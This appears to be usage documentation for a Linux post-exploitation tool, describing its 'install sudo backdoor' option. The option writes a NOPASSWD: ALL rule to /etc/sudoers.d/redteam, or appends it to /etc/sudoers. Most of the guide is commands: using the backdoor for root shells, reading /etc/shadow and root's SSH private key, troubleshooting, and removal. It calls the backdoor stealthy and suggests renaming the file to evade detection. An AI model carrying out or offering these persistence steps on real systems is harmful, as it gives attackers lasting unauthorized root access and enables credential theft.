# Option 2: Install Sudo Backdoor

## Overview

**Purpose:** Grants passwordless sudo access to your user account, allowing you to run any command as root without entering a password.

**How It Works:**
1. Creates a sudoers file entry for your user account
2. Grants `NOPASSWD: ALL` privilege (no password required for any command)
3. Survives reboots and provides persistent privilege escalation
4. Works as long as your user account exists

---

## Prerequisites

- Successfully executed the exploit and gained root privileges
- Know your current username (the user account you're using)
- Access to the post-exploitation menu

---

## Step-by-Step Instructions

### Step 1: Run the Exploit and Gain Root Access

**Location:** Target machine

```bash
# Execute the exploit
./comprehensive

# Wait for privilege escalation to complete
# You should see:
# [INFO] Successfully gained root privileges!
```

### Step 2: Select Option 2 from the Menu

**Location:** Target machine

When the post-exploitation menu appears, select option 2:

```
╔══════════════════════════════════════════════════╗
║        POST-EXPLOITATION MENU                    ║
╚══════════════════════════════════════════════════╝

Available actions:
  1. Inject SSH backdoor key
  2. Install sudo backdoor
  3. Install cron persistence
  ...
  
Select option: 2
```

### Step 3: Verify Installation

**Location:** Target machine

You should see confirmation messages:

```
[INFO] Installing sudo backdoor
[INFO] Created sudoers file for user: your_username
[INFO] User your_username can now run 'sudo <command>' without password
```

**Note the username** - this is the account that now has sudo access.

### Step 4: Exit the Exploit

**Location:** Target machine

Press Enter to continue, then select option `0` to exit and cleanup:

```
Select option: 0
Cleaning up...
```

The exploit will exit, but the sudo backdoor remains installed.

---

## Using the Sudo Backdoor

### Basic Usage

**Location:** Target machine (as your regular user)

Once you've exited the exploit, you can use sudo without a password:

```bash
# Verify your current user
whoami
# Output: your_username

# Test sudo access (should NOT ask for password)
sudo whoami
# Output: root

# Get root shell
sudo /bin/bash

# Or use sudo -i for root login shell
sudo -i
```

### Verify Sudo Permissions

**Location:** Target machine

```bash
# Check your sudo permissions
sudo -l

# Expected output:
# Matching Defaults entries for your_username on hostname:
#     env_reset, mail_badpass, secure_path=...
# 
# User your_username may run the following commands on hostname:
#     (ALL : ALL) NOPASSWD: ALL
```

The key part is `(ALL : ALL) NOPASSWD: ALL` - this means:
- You can run **ALL** commands
- As **ALL** users (including root)
- With **NOPASSWD** (no password required)
- From **ALL** hosts

### Verify the Backdoor File

**Location:** Target machine

```bash
# Check the sudoers file that was created
sudo cat /etc/sudoers.d/redteam

# Expected output:
# your_username ALL=(ALL:ALL) NOPASSWD: ALL
```

---

## Practical Examples

### Example 1: Quick Root Shell

```bash
# Get instant root access
sudo /bin/bash

# You're now root
root@target:~# whoami
root
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Example 2: Run Individual Commands as Root

```bash
# Read protected files
sudo cat /etc/shadow
sudo cat /root/.bash_history

# Modify system files
sudo nano /etc/passwd
sudo systemctl restart sshd

# Install packages
sudo apt update
sudo apt install nmap

# Change file ownership
sudo chown root:root /path/to/file
```

### Example 3: Access Root's Home Directory

```bash
# List root's files
sudo ls -la /root

# Read root's files
sudo cat /root/.ssh/id_rsa
sudo cat /root/flag.txt

# Copy files as root
sudo cp /root/important_file /tmp/
```

### Example 4: System Administration Tasks

```bash
# Stop services
sudo systemctl stop apache2

# Start services
sudo systemctl start sshd

# Check system logs
sudo journalctl -xe
sudo tail -f /var/log/syslog

# Modify network settings
sudo ip addr add 192.168.1.100/24 dev eth0
```

### Example 5: Install Additional Tools

```bash
# Install packages
sudo apt install -y netcat-openbsd python3 python3-pip

# Install from source
sudo make install

# Add repositories
sudo add-apt-repository universe
```

---

## What Gets Installed

### File Created

**Location:** `/etc/sudoers.d/redteam`

**Content:**
```
your_username ALL=(ALL:ALL) NOPASSWD: ALL
```

**File Permissions:**
- Mode: `0440` (read-only for owner and group)
- Owner: `root:root`

### Backup Method

If creating `/etc/sudoers.d/redteam` fails, the exploit will append to the main sudoers file:

**Location:** `/etc/sudoers`

**Added line:**
```
redteam ALL=(ALL:ALL) NOPASSWD: ALL
```

**Note:** This method is less clean and harder to remove.

---

## Advantages

1. **Persistent:** Survives reboots and system updates
2. **Stealthy:** Looks like a legitimate sudoers entry
3. **Instant:** No password prompt - immediate privilege escalation
4. **Full Access:** Can run any command as any user
5. **Easy to Use:** Just prefix commands with `sudo`
6. **Maintainable:** Can be easily modified or removed

---

## Common Use Cases

### Quick System Access

```bash
# Need root access quickly?
sudo bash

# Check something as root?
sudo cat /etc/shadow
```

### Maintaining Access

```bash
# Even if you lose root shell, you can always:
sudo whoami
# Output: root
```

### Privilege Escalation After Login

```bash
# You logged in as regular user
ssh user@target

# Instantly escalate to root
sudo /bin/bash
```

### Script Execution

```bash
# Run scripts as root without password
sudo ./script.sh
sudo python3 exploit.py
```

---

## Verification Checklist

After installing the backdoor, verify everything works:

- [ ] `sudo whoami` returns `root` without password
- [ ] `sudo -l` shows `(ALL : ALL) NOPASSWD: ALL`
- [ ] File `/etc/sudoers.d/redteam` exists and contains your username
- [ ] Can run `sudo /bin/bash` without password
- [ ] Can read `/etc/shadow` with `sudo cat /etc/shadow`
- [ ] Can access `/root` directory with `sudo ls /root`

---

## Troubleshooting

### Issue: Sudo Still Asks for Password

**Symptoms:**
```
[sudo] password for your_username:
```

**Possible Causes:**
1. Backdoor wasn't installed correctly
2. Wrong username was used
3. Sudoers file has syntax errors

**Solutions:**

**Check if file exists:**
```bash
ls -la /etc/sudoers.d/redteam
cat /etc/sudoers.d/redteam
```

**Verify sudoers syntax:**
```bash
sudo visudo -c
```

**Check your username:**
```bash
whoami
```

**Reinstall the backdoor:**
```bash
# Run exploit again and select option 2
./comprehensive
# Select option: 2
```

### Issue: "sudo: /etc/sudoers.d/redteam is world writable"

**Symptoms:**
```
sudo: /etc/sudoers.d/redteam is world writable
```

**Solution:**
```bash
# Fix permissions
sudo chmod 0440 /etc/sudoers.d/redteam
sudo chown root:root /etc/sudoers.d/redteam
```

### Issue: "user is not in the sudoers file"

**Symptoms:**
```
your_username is not in the sudoers file. This incident will be reported.
```

**Causes:**
1. File wasn't created
2. Wrong location
3. Sudoers not configured to read `/etc/sudoers.d/`

**Solutions:**

**Check if file exists:**
```bash
ls -la /etc/sudoers.d/redteam
```

**Check sudoers includes:**
```bash
sudo grep "#includedir /etc/sudoers.d" /etc/sudoers
```

**Manually add to main sudoers:**
```bash
echo "your_username ALL=(ALL:ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers
```

---

## Removing the Backdoor (Cleanup)

If you need to remove the backdoor:

```bash
# Method 1: Remove the file
sudo rm /etc/sudoers.d/redteam

# Method 2: Edit and remove line from /etc/sudoers
sudo visudo
# Remove the line containing your username or "redteam"

# Verify removal
sudo -l
# Should show: "your_username is not in the sudoers file"
```

---

## Important Notes

1. **Username Matters:** The backdoor is installed for the user who ran the exploit. Make sure you're logged in as that user when using sudo.

2. **Multiple Users:** If different users run the exploit, each will get their own sudo backdoor entry.

3. **Detection:** The file `/etc/sudoers.d/redteam` is easily identifiable. Consider renaming it to something more legitimate.

4. **Persistence:** The backdoor persists indefinitely until manually removed, even across reboots and system updates.

5. **Scope:** `NOPASSWD: ALL` means you can run ANY command as ANY user without a password - use responsibly.

---
